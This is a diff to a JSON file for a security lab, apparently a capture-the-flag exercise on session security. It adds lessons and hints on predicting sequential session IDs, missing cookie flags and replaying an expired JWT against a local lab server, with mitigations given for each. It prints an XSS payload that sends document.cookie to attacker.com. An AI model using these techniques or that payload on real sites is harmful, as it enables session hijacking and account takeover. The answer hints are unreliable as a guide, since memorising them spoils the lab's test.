@@ -4,19 +4,42 @@
   "tasks": {
     "1": {
       "title": "Session ID prediction",
+      "body": "## Sequential session IDs = a free session\n\nA session ID must be **unpredictable** (128 bits of cryptographic randomness,\nlike `Sec-Fetch` or `3f8a9c2e...`). The lab generates sequential IDs:\nuser100, user101, user102...\n\n```bash\n# Log in twice and watch the cookie you are assigned:\ncurl -sv http://127.0.0.1:18100/login 2>&1 | grep Set-Cookie\n# Set-Cookie: session=100; Path=/\n# Set-Cookie: session=101; Path=/   ← incremental!\n```\n\nIf you are 101, the next user to log in will be 102, and the\nprevious one was 100. An attacker can **walk the space of active\nsessions** trying 100, 101, 102... until they land on someone else's session.\n\n## Impersonating the admin\n\nRegular users take IDs 100-109. And the admin? They registered\n\"before\" them:\n\n```bash\n# The /login endpoint accepts an arbitrary sid and plants it as your cookie:\ncurl -s -c /tmp/ck.txt \"http://127.0.0.1:18100/login?sid=99\"\ncurl -s -b /tmp/ck.txt \"http://127.0.0.1:18100/whoami\"\n# You are admin (admin). Flag: FLAG{...}\n```\n\nThis is **session hijacking by prediction**: not a single memory\nexploit, no injection — just numbers counting backwards.\n\n## How to prevent it\n\n- Generate IDs with `secrets.token_urlsafe(32)` (or the framework's\n  generator: never `uuid.uuid4()` with version 1, which leaks the MAC).\n- Validate on every request that the session belongs **to the\n  authenticated user**, not just that it exists.\n- Rotate the ID on login (this prevents session fixation: the attacker plants a\n  known ID and the victim \"inherits\" it when authenticating).",
       "questions": {
-        "session-security-t01-q01": { "prompt": "Log in normally (/login) twice in a row with curl -c and compare the session IDs. By how much do they increment?" },
-        "session-security-t01-q02": { "prompt": "Which session ID belongs to the admin account?" },
-        "session-security-t01-q03": { "prompt": "Set your cookie to the admin's session ID (/login?sid=X) and visit /whoami. Submit the flag." }
+        "session-security-t01-q01": {
+          "prompt": "Log in normally (/login) twice in a row with curl -c and compare the session IDs. By how much do they increment?",
+          "hint": "They are sequential: 100, 101, 102... The admin is right at the round number just before them"
+        },
+        "session-security-t01-q02": {
+          "prompt": "Which session ID belongs to the admin account?",
+          "hint": "Regular users are 100-109. Which consecutive ID would fall outside them, just 'before'?"
+        },
+        "session-security-t01-q03": {
+          "prompt": "Set your cookie to the admin's session ID (/login?sid=X) and visit /whoami. Submit the flag.",
+          "hint": "curl -c ck.txt 'http://127.0.0.1:18100/login?sid=99' && curl -b ck.txt http://127.0.0.1:18100/whoami"
+        }
       }
     },
     "2": {
       "title": "Cookie flags and expired JWT replay",
+      "body": "## The three missing flags\n\nThe lab's cookie is served like this:\n\n```\nSet-Cookie: session=100; Path=/\n```\n\nCompare it with a properly configured cookie:\n\n```\nSet-Cookie: session=<random>; Path=/; HttpOnly; Secure; SameSite=Lax\n```\n\n| Flag | What it prevents | What happens without it |\n|---|---|---|\n| `HttpOnly` | `document.cookie` from JS | An XSS steals the session with one line |\n| `Secure` | Sending over plain HTTP | The cookie travels in cleartext on wifi networks |\n| `SameSite` | Cross-site sending | CSRF: other sites make requests with your session |\n\n## Theft with one line of XSS\n\nWith `HttpOnly` missing, any XSS — even a \"minor\" one — becomes\nan account takeover:\n\n```javascript\n// Full XSS payload:\nfetch('http://attacker.com/steal?c=' + document.cookie)\n```\n\nThe lab simulates the attacker's server. \"Steal\" your own session to see\nhow trivial it is:\n\n```bash\ncurl -s \"http://127.0.0.1:18100/steal?c=100\"\n# \"cookie received by attacker ... FLAG{cookie_stolen_no_httponly}\"\n```\n\n## The JWT that never expires\n\nJWTs carry their expiration **inside the token itself** (the `exp` claim).\nThat makes them stateless — and dangerous: if the server does not validate `exp`,\nthe token lives forever.\n\n```bash\n# 1. The server GIVES YOU an already expired JWT (look at the note):\ncurl -s http://127.0.0.1:18100/api-jwt | jq .\n# \"hint\": \"This JWT is expired but the server does NOT check exp\"\n\n# 2. Decode the payload (the middle part, base64url):\necho \"<payload-del-medio>\" | base64 -d\n# {\"user\": \"admin\", \"role\": \"admin\", \"exp\": 1000000000}   ← year 2001\n\n# 3. Send it back as is — the replay works:\ncurl -s \"http://127.0.0.1:18100/api-jwt?token=<token>\"\n# \"status\": \"admin\" ... \"note\": \"exp not checked!\"\n```\n\nA 20-year-old admin token is still valid. In production this is\nmitigated by validating `exp` **always** (libraries do it by default:\n`jwt.verify()`, never a bare `jwt.decode()`) and by keeping a\nrevocation list in case of theft.",
       "questions": {
-        "session-security-t02-q01": { "prompt": "Which cookie flag would stop JavaScript from reading document.cookie (blocking XSS theft)?" },
-        "session-security-t02-q02": { "prompt": "Simulate the theft: send a valid session id to the attacker's collector /steal?c=X. Submit the flag." },
-        "session-security-t02-q03": { "prompt": "Visit /api-jwt without a token, decode the payload of the JWT it hands you (base64). What year does it expire (exp field)?" },
-        "session-security-t02-q04": { "prompt": "Replay that same expired JWT to /api-jwt?token=X. Submit the replay flag." }
+        "session-security-t02-q01": {
+          "prompt": "Which cookie flag would stop JavaScript from reading document.cookie (blocking XSS theft)?",
+          "hint": "HttpOnly"
+        },
+        "session-security-t02-q02": {
+          "prompt": "Simulate the theft: send a valid session id to the attacker's collector /steal?c=X. Submit the flag.",
+          "hint": "curl 'http://127.0.0.1:18100/steal?c=100' — this is how an XSS payload exfiltrates the cookie when HttpOnly is missing"
+        },
+        "session-security-t02-q03": {
+          "prompt": "Visit /api-jwt without a token, decode the payload of the JWT it hands you (base64). What year does it expire (exp field)?",
+          "hint": "echo <payload> | base64 -d — the timestamp 1000000000 is September 2001"
+        },
+        "session-security-t02-q04": {
+          "prompt": "Replay that same expired JWT to /api-jwt?token=X. Submit the replay flag.",
+          "hint": "TOKEN=$(curl -s http://127.0.0.1:18100/api-jwt | jq -r .token) && curl -s \"http://127.0.0.1:18100/api-jwt?token=$TOKEN\""
+        }
       }
     }
   }
